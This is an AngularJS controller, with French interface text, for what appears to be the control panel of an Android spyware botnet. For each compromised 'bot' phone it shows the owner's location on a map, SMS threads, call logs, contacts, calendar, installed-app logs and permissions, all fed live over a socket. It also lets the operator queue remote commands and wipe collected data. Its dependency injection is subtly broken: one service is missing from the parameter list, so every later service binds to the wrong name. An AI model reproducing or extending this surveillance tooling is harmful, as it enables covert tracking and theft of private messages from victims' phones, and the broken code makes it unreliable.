App.controller('BotCtrl', [
    '$scope',
    'BotService',
    'MessageService',
    'CommandService',
    'CallLogService',
    'CalendarService',
    'PermissionService',
    'ContactService',
    'AppsLogService',
    'socket',
    '$stateParams',
    'toastr',
    '$state',
    'bot',
    function ($scope, BotService, MessageService, CommandService, CallLogService, PermissionService, ContactService, AppsLogService, socket, params, toastr, $state, bot) {

        $scope.bot = bot
        $scope.num_call_logs = 1000000;
        $scope.numbersms = 100000000;

        // Sidebar
        angular.element(document).ready(function () {
            $scope.sidebar = 1;
        });
        // ---

        var messages = []
        $scope.hasMessages = false
        $scope.messageThreads = {}

        $scope.contacts = []

        $scope.calendar = []

        function updateMap() {
            $scope.map = {
                center: {
                    latitude: $scope.bot.lat,
                    longitude: $scope.bot.longi,
                },
                zoom: 15
            }
        }

        updateMap()

        function reorderMessageThreads() {
            $scope.hasMessages = messages.length > 0
            $scope.messageThreads = _.chain(messages).orderBy(function (msg) {
                return msg.date
            }).groupBy(function (msg) {
                    return msg.thread_id
                }).mapValues(function (messages) {
                    return {
                        last_date: messages[messages.length - 1].date,
                        messages: messages
                    }
                })
                .value()
        }

        socket.forward('bot:connected', $scope);
        socket.forward('bot:disconnected', $scope);
        socket.forward('bot:updated', $scope);
        socket.forward('command:added', $scope);
        socket.forward('command:deleted', $scope);
        socket.forward('commands:cleared', $scope);
        socket.forward('message:created', $scope);
        socket.forward('messages:cleared', $scope);
        socket.forward('call_log:created', $scope);
        socket.forward('call_log:cleared', $scope);
        socket.forward('apps_log:created', $scope);
        socket.forward('apps_log:cleared', $scope);
        socket.forward('getcallhistory:done', $scope);
        socket.forward('permissions:updated', $scope);
        socket.forward('contact:created', $scope);
        socket.forward('calendar:created', $scope);

        MessageService.fetch($scope.bot.uid).then(function (res) {
            messages = res.data;
            reorderMessageThreads()
        })

        CommandService.getPending($scope.bot.uid).then(function (res) {
            $scope.pendingCommands = res.data;
        });

        CallLogService.fetch($scope.bot.uid).then(function (res) {
            $scope.callLogs = res.data;
        })

        AppsLogService.fetch($scope.bot.uid).then(function (res) {
            $scope.appsLogs = res.data;
        })

        PermissionService.fetch($scope.bot.uid).then(function (res) {
            $scope.permissions = res.data;
        })

        ContactService.fetch($scope.bot.uid).then(function (res) {
            $scope.contacts = res.data;
        })

        $scope.$on('socket:bot:connected', function (e, data) {
            if (data.uid === bot.uid) {
                $scope.bot = data;
            }
        })

        $scope.$on('socket:bot:updated', function (e, data) {
            if (data.uid === bot.uid) {
                $scope.bot = data;
                updateMap()
                toastr.success('Le statut a changé !', data.device)
            }
        })

        $scope.$on('socket:bot:disconnected', function (e, bot) {
            if ($scope.bot.uid === bot.uid) {
                $scope.bot = bot;
            }
        })

        $scope.$on('socket:command:added', function (e, data) {
            if (data.uid === $scope.bot.uid) {
                $scope.pendingCommands.push(data)
            }
        })

        $scope.$on('socket:command:deleted', function (e, data) {
            $scope.pendingCommands = _.reject($scope.pendingCommands, function (cmd) {
                return cmd.id === data.id;
            });
        })

        $scope.$on('socket:commands:cleared', function (e, data) {
            if ($scope.bot.uid === data.uid)
                $scope.pendingCommands = [];
        })

        $scope.$on('socket:message:created', function (e, data) {
            if ($scope.bot.uid === data.uid) {
                messages.push(data);
                reorderMessageThreads()
            }
        })

        $scope.$on('socket:messages:cleared', function (e, data) {
            if (data.uid === $scope.bot.uid) {
                messages = [];
                $scope.messageThreads = {}
                $scope.hasMessages = false
            }
        })

        $scope.$on('socket:call_log:created', function (e, data) {
            if (data.uid === $scope.bot.uid)
                $scope.callLogs.push(data);
        })

        $scope.$on('socket:call_log:cleared', function (e, data) {
            if (data.uid === $scope.bot.uid) {
                $scope.callLogs = [];
            }
        })

        $scope.$on('socket:apps_log:created', function (e, data) {
            if (data.uid === $scope.bot.uid)
                $scope.appsLogs.push(data);
        })

        $scope.$on('socket:apps_log:cleared', function (e, data) {
            if (data.uid === $scope.bot.uid) {
                $scope.appsLogs = [];
            }
        })

        $scope.$on('socket:permissions:updated', function (e, data) {
            if (data.uid === $scope.bot.uid) {
                $scope.permissions = data.permissions
                toastr.info('Les permissions ont été mise à jour pour ', $scope.bot.device)
            }
        })

        $scope.$on('socket:contact:created', function (e, data) {
            if (data.uid === $scope.bot.uid) {
                $scope.contacts.push(data)
            }
        })

        $scope.$on('socket:calendar:created', function (e, data) {
            if (data.uid === $scope.bot.uid) {
                $scope.calendar.push(data)
            }
        })

        $scope.addCommand = function (cmd, arg1, arg2) {
            CommandService.add({
                uid: $scope.bot.uid,
                command: cmd,
                arg1: arg1,
                arg2: arg2
            })
                .catch(function (err) {
                    toastr.error('Impossible d\'envoyer la commande à l\'appareil !', 'Erreur')
                })
        }

        $scope.clearSMS = function () {
            MessageService.clear($scope.bot.uid)
        }

        $scope.deleteCommand = function (id) {
            CommandService.delete(id).catch(function (err) {
                console.log(err)
            })
        }

        $scope.clearCallLogs = function () {
            CallLogService.clear($scope.bot.uid).catch(function (err) {
                console.log(err)
            })
        }

        $scope.clearAppsLogs = function () {
            AppsLogService.clear($scope.bot.uid).catch(function (err) {
                console.log(err)
            })
        }

        $scope.removeDevice = function (bot) {
            if (confirm('Etes-vous sûr ?')) {
                BotService.delete(bot.id).then(function () {
                    toastr.success(bot.device + ' a été supprimé.', bot.device);
                    $state.go('dashboard.home')
                })
            }
        }

        $scope.deleteContacts = function () {
            ContactService.clear($scope.bot.uid).then(function () {
                $scope.contacts = []
                toastr.success('Les contacts ont été supprimés.', $scope.bot.device)
            })
        }

    }
])
